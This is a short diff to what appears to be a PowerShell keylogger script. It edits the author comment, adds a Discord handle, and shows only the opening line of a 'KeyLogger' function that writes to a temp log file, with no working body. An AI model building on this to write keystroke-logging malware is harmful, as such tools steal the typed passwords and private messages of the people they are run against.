@@ -1,4 +1,5 @@
-#MADE BY SYKE
+# MADE BY SYKE
+# Discord: syke#1166 / Syke#1166
 
 # keylogger
 function KeyLogger($logFile="$env:temp/keylogger.log") {
